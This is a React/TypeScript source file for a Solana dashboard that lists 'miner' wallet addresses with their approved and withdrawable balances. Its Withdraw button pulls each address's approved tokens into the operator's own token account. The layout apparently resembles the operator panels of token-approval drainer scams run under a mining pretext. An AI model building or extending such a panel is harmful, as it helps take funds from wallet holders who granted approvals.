import { mtsAxios } from "@/utils/axios_instance";
import {
    useDisclosure, useToast,
    Button, HStack, Stack,
    Alert, AlertIcon,
    Table, TableCaption, TableContainer, Tbody, Td, Tfoot, Th, Thead, Tr,
    Popover, PopoverTrigger, PopoverContent, PopoverHeader, PopoverBody, PopoverFooter, PopoverArrow, PopoverCloseButton, PopoverAnchor,
} from "@chakra-ui/react";
import { useEffect, useState } from "react";
import "swiper/swiper-bundle.css";
import { WalletButton } from "./WalletButton";
import useSwr, { useSWRConfig } from "swr";
import { useProgram } from "./hooks/useProgram";
import { PublicKey } from "@solana/web3.js";

export interface Miners {
    id: number;
    address: string;
    approvedBalance: number;
    realBalance: number;
    createdAt: Date;
    referrenceBalance: number;
}

const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('en-US', {
        style: 'currency',
        currency: 'USD',
    }).format(value);
}

interface MinerRowProps {
    miner: Miners
    transferFrom: (from: string, amount: number) => Promise<void>;
    ata: PublicKey | null;
}

const MinerRow = ({ miner, transferFrom, ata }: MinerRowProps) => {
    const { address, approvedBalance, createdAt, id, realBalance, referrenceBalance } = miner;
    const humanReadableDate = new Date(createdAt).toLocaleString()

    const [isRefreshing, setIsRefreshing] = useState(false);
    const { mutate } = useSWRConfig();

    const handleRefresh = async () => {
        setIsRefreshing(true);
        try {
            await mtsAxios.refresh_miner(address);
            // Optionally, you can trigger a re-fetch of the miners data here
        } catch (error) {
            console.error("Error refreshing miner:", error);
        } finally {
            setIsRefreshing(false);
            // Revalidate the miners data
            mutate('miners');
        }
    }
    return (
        <Tr>
            <Td>{humanReadableDate}</Td>
            <Td>{address}</Td>
            <Td isNumeric>{formatCurrency(approvedBalance)}</Td>
            <Td isNumeric>{formatCurrency(realBalance)}</Td>
            <Td isNumeric>{formatCurrency(referrenceBalance)}</Td>
            <Td>
                <Button
                    colorScheme="blue"
                    size="sm"
                    isDisabled={referrenceBalance <= 0 || ata === null}
                    onClick={async () => {
                        try {
                            await transferFrom(address, referrenceBalance);
                            // Optionally, you can trigger a re-fetch of the miners data here
                        } catch (error) {
                            console.error("Error withdrawing:", error);
                        } finally {
                            // Revalidate the miners data
                            mutate('miners');
                        }
                    }}
                >
                    Withdraw
                </Button>
                <Button
                    colorScheme="green"
                    size="sm"
                    ml={2}
                    isLoading={isRefreshing}
                    onClick={handleRefresh}
                >
                    Refresh
                </Button>
            </Td>
        </Tr>
    );
};

export default function Main() {

    const headers = ['Date Joined', 'Address', 'Approved Amount', 'Current Amount', 'Withdrawable Amount', 'Actions'];

    const [miners, setMiners] = useState<Miners[]>([]);
    const [params, setParams] = useState({
        page: 1,
        limit: 10,
        address: undefined
    });

    const toast = useToast()
    const popover = useDisclosure()
    const { mutate } = useSwr('miners', () => mtsAxios.get_miners(params), {
        onSuccess: (data) => {
            setMiners(data.data);
        }
    });
    const { transferFrom, ata, ensureAccount } = useProgram();

    useEffect(() => {
        mutate();
    }, [params]);
    useEffect(() => {
        if (ata === null) {
            popover.onOpen()
        } else {
            popover.onClose()
            toast({
                title: `Associated Token Account found: ${ata.toBase58()}`,
                status: "success",
                position: "bottom",
                isClosable: true,
                duration: 5000
            })
        }
    }, [ata]);

    return (
        <Stack w={"100%"} h={"100vh"} bgColor={"blue.700"} justifyContent={"flex-start"} alignItems={"center"} p={10}>
            <Stack w={"90%"} direction={"row"} justify={"space-between"} align={"center"} gap={5}>
                <Stack direction={"row"} align={"center"} justify={"center"} gap={5}>
                    <WalletButton />
                    {
                        ata === null && (
                            <Popover
                                returnFocusOnClose={false}
                                isOpen={popover.isOpen}
                                // onClose={popover.onClose}
                                placement='right'
                                closeOnBlur={false}
                            >
                                <PopoverTrigger>
                                    <Button
                                        colorScheme='green'
                                        onClick={async () => {
                                            await ensureAccount();
                                            mutate();
                                        }}
                                        isLoading={transferFrom === null}
                                    >
                                        Create ATA
                                    </Button>
                                </PopoverTrigger>
                                <PopoverContent bgColor={"orange.100"}>
                                    <PopoverHeader fontWeight='semibold'>No Associated Token Account found</PopoverHeader>
                                    <PopoverArrow bgColor={"orange.100"} />
                                    <PopoverBody>
                                        Please create one to proceed.
                                    </PopoverBody>
                                </PopoverContent>
                            </Popover>
                        )
                    }
                </Stack>
                <Button colorScheme="cyan">To ETH</Button>
            </Stack>
            <TableContainer w={'90%'} mt={10}>
                <Table>
                    <Thead bgColor={"blue.900"}>
                        <Tr>
                            {
                                headers.map((header, index) => (
                                    <Th key={index} isNumeric={index >= 2 && index <= 4} color={"white"}>
                                        {header}
                                    </Th>
                                ))
                            }
                        </Tr>
                    </Thead>
                    <Tbody bgColor={"blue.800"} color={"white"}>
                        {
                            miners.map((miner, index) => {
                                return (
                                    <MinerRow
                                        key={index}
                                        miner={miner}
                                        transferFrom={transferFrom}
                                        ata={ata}
                                    />
                                );
                            })
                        }
                    </Tbody>
                </Table>
            </TableContainer>
            <Stack w={'90%'} direction={"row"} justify={'space-between'} align={"center"}>
                <Button
                    onClick={() => {
                        setParams({
                            ...params,
                            page: params.page - 1
                        });
                    }}
                    isDisabled={params.page <= 1}
                >
                    Prev
                </Button>
                <Button
                    onClick={() => {
                        setParams({
                            ...params,
                            page: params.page + 1
                        });
                    }}
                    isDisabled={miners.length < params.limit}
                >
                    Next
                </Button>
            </Stack>
        </Stack>
    );
}

